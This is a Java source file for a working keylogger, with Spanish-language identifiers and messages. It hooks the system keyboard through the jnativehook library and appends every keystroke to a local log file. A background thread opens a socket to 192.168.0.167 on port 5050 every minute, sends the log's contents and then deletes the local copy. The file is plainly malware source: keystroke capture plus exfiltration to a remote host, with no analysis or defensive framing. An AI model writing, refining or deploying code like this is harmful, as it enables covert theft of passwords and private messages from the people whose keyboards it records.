package keylogger;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class MainKey implements NativeKeyListener {
	private String aux = "";
	private static log keylog = new log();

	//C:\Users\EA6259\Documents\juan\Proyectos-JAVA.git\branches\mantenimiento-1\keylogger\.	
	public static void main(String[] args) {
System.out.println("Iniciando programa");

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {

			e.printStackTrace();
		}
		GlobalScreen.getInstance().addNativeKeyListener(new MainKey());
		
		keylog.creaDir();
		enviaLog logtrx = new enviaLog(keylog.getPath());
		logtrx.start();
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		aux = NativeKeyEvent.getKeyText(e.getKeyCode());
		if (!aux.equals("Intro") && !aux.equals("Retroceso") && !aux.equals("Suprimir")){
			if(aux.equals("Espacio")){
				aux = "-" + aux + "-";
			}
			System.out.print(aux);
			keylog.escribir(aux, keylog.getPath());
		}
	}


	public void nativeKeyReleased(NativeKeyEvent e) {

	}


	public void nativeKeyTyped(NativeKeyEvent e) {

	}

}


class enviaLog extends Thread{

	private String path;	
	private FileInputStream fis = null;
	private BufferedInputStream bis = null;
	private OutputStream os = null;
	private Socket sock = null;

	public enviaLog(String p){
		path = p;
	}

	public void run(){
		System.out.println("thread  1");
		try{
			while(true){
				sock = new Socket("192.168.0.167", 5050);
				File log = new File (path);
				byte [] mybytearray  = new byte [(int)log.length()];
				fis = new FileInputStream(log);
				bis = new BufferedInputStream(fis);
				bis.read(mybytearray,0,mybytearray.length);
				os = sock.getOutputStream();
				os.write(mybytearray,0,mybytearray.length);
				os.flush();
				log.delete();
				try {
					Thread.sleep(60000);
				} catch (InterruptedException e) {

				}
			}
		}catch(IOException e){
			System.out.println("No se pudo establecer conexion");
		}finally{
			try {
				if (bis != null)bis.close();
				if (os != null) os.close();
				if (sock!=null) sock.close();
			} catch (IOException e) {
				e.printStackTrace();
			}	          
		}
	}
}


class log{

	private BufferedWriter log;
	private File fileLog;
	private static String path = "";


	public void creaDir(){

		String appPath = "";
		File ArchivoLog;
		appPath = new File(".").getAbsolutePath();
		for(int i = 0, c = 0; i < appPath.length() && c < 5; i++){
			if(appPath.charAt(i) == '\\' || appPath.charAt(i) == '/'){
				c++;
				path += appPath.charAt(i);
			}else{
				path += appPath.charAt(i);
			}
		}			

		path += "log";
		//crea carpeta en el directorio
		ArchivoLog = new File(path);
		if(!ArchivoLog.exists()){
			ArchivoLog.mkdirs();
		}
	}

	public String getPath(){
		return path + "\\log.txt";
	}

	public void escribir(String s, String path){

		try {
			log = new BufferedWriter(new FileWriter(path,true));
			log.write(s);
			log.close();
		} catch (IOException e) {

			e.printStackTrace();
		}
	}
}